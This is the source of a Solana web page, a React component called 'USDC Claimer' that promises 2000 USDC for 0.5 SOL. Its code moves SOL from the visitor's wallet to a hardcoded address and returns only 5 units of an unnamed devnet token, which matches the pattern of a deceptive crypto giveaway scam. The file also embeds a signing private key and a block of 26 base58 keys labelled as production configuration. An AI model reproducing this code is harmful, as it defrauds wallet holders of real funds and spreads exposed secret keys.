/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "snq1ZzmwTmZ2M9jcbxvEHAjGt3GJaEWmnf9RBA4t4ArMpVuNXkCGGyQR7wNAtoRQwBbVVkJxKYt7KjdBu249d7x"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4uFxbdbv3vPmZhPSU9hequT9PkXxGpXDSBLFDQejAby8ZCeMyYsrQV18MCDHa9dD2niocUKBygJGPsp2hqzKAwv9",
  "key1": "ChugFCKoi6HfobiPAG9DQRDmX2gZ6AbY2kdWXSZ22vut1RY6PFpL18ZC9aWvkT2NLHBUb8NCQYDeCNxmdXFsffr",
  "key2": "A5mgqwM1pdfwJWx6iseKfS63DUVAqXKMevXAnaU31Websw399KdGAj7q3osgdM4G1pvwdXaSKGgLdGcSAL1ZT5N",
  "key3": "25r8W19K7BunwoFUngokUbis6CZkwoGGEppofWUHXHiMiD5mYuE9fFFbwZhZT2tyoxfNNqdDnqxkgZ7FyZnVvFXJ",
  "key4": "pt3Df5YPXJgtApnnHdF35nDdKNg8y7NYfWbJha8YBaNU8tYGPnq2LWzVjBr5pegcjTV6nQ3ShzApir1t2afarud",
  "key5": "mQKt56xYrRCKPfN7HFRU8VkvyCGesaxx2ASjjgNQgYx2EsuAgbDvtGHtdKjxxchfW1Gw9FDUtS1BJrZTU4cCD39",
  "key6": "4cpb2uHZHgbBZhNBkbmC7GCJQpZYdxf26wEcDTfnuWA3isZSp2SekjGkiH8wApfmCPYuFTkvSVFtXDNZNJwS5saQ",
  "key7": "5bCXEhcU4UE1Hhv2MNu6vB3XrtvrGzA4ibx4DBjt2UbrULGAGL6nDNvopHmdTs5omo8Tb7qdiK5KdwB3zv5YLbpF",
  "key8": "moKpokSudRjcEZ7MPvLbMh2x5LQ4bTQ66yfqSCAEcVZ2SwxG3QLW1ty8CLKRBTX7LSssY9upFU21raStWXK4sMB",
  "key9": "5i35xgXoJgH2dDfuWXwvTc2aDxAcxCL8QY9kFXVEwpF8XwQjVVZKHjSRCwDoTCXXme3mfrQT8M2i6nJar4nZs5TN",
  "key10": "2TfF7V63XmmVdvkwqc4jGS4X2p7gEuaaWGE7Mqw2pNcWwK7F3r6jcv7qB9tt4yN21V4Ls5GdmxZmSGJzbDykBD9N",
  "key11": "4DP2HZjS6omXtNM9dx7fWXbefL5WKeZ1w8R5nj1Cf9ffjMD8EQAGwHuXHi2f3g6LjE617gvJVmCN9JnqPP5Denk8",
  "key12": "4obTi7pghJse3gyzEYhRK7G4HVKVJ8XDvPyiMWZLNky8erb9rAeZ7xo9zymQeu9fEdCCQVSKobGa6TTtrDUvXuz3",
  "key13": "nG3VjYQ1D21UhkKQ4Xi5denNjD2oUSihFszbYXiShPvBamA16pzYruEYQs3eLn8hEMYiV1iCFEReoeedReHuUz1",
  "key14": "4WjNiPS3SZBx8TVnrNytw6yhF4zuv8M66PrxSVyP7kb46Es8vWREbs7gUPkByVGzdbSxQ3kDT1iN8zTfYEKLiuMg",
  "key15": "36fKFnjaqVXY88hU3KPtDvDG4J5Fbw4AVg192seTw3xfAwYi1BGZu54DqWWmSqNH27sGCaP9q5K9N7gYRUFfNZxy",
  "key16": "4sdC9vxBPNVp3cLYjh726MzHX5ksEBkmFPHuRxECW55gz9r5zhKLN6BCY8kpWxNhHrQ1wFXHPfdGynX5tWXjAvfP",
  "key17": "3V8YB11tNjTzwihStTLhwZiATA4kyo7WF8ZRcs43wEYKXEucwece4YfyTvAcceXWmmpWUeb9xhkXEcwFC8YkxqmY",
  "key18": "5VEtTvrB99Ssvpbr5QPfvkgHDgmnZtph432QhnHdBNuRz5xWnPYoGRYDDuBcZtveXucBxH8Fkg6YS7sNHeaVDNfU",
  "key19": "GvvsG6GujhW3QjzmdieiqCrfrZGUcu5qxodtinimcwnHV5LsEWT4R429rzd9XmaAvGXEi6afeCGphKJpgYQUcyb",
  "key20": "5ATbn3EbN7LGL83ocqKutVfRUZftP1xW2ZaWxW1sYPpN9tNR9f44kGtQcJ92jZCn1aYpZ21dKerQRqcqcuZJcNBB",
  "key21": "5i62TvDi79NQMiNaGCJnmssZhyLkdCzSkqUB4tR65gzeynH16b847C9JsL4o46ZReEABwQgxK7nr9Djj3vjEuQTS",
  "key22": "oC6a8VgSx3YXgo69wbXs2WKj3ai2YesQdyutg4zjWY4VeTtCQfKsKWS1twDwYhXEfsAcpcvYAoFhegKXFZv5tch",
  "key23": "4JNoAebjotES1dWwUd4JerFpNnXhJzfqKMJAQR2SY8LB7kTXy6e35SwwG4DxCJaZFKkxau49pQeRXWMyiTB1SbLi",
  "key24": "SwYTEtXuSEuJZVLt7PH2Wsrns3WbK9BnfXfxftDcejw4swVb8tH6brzqBQuXNjkR6HZtfHq3BjfC825xmfn5rwF",
  "key25": "3VB8XoYr6FUN6r8EWcb2gGWt8GTKpC8mJ9ZkxNmLkQ7LNY5E4zT5vBSykSDECNkXtFyTCfYdaGSQx1UW3ghJtdpb"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
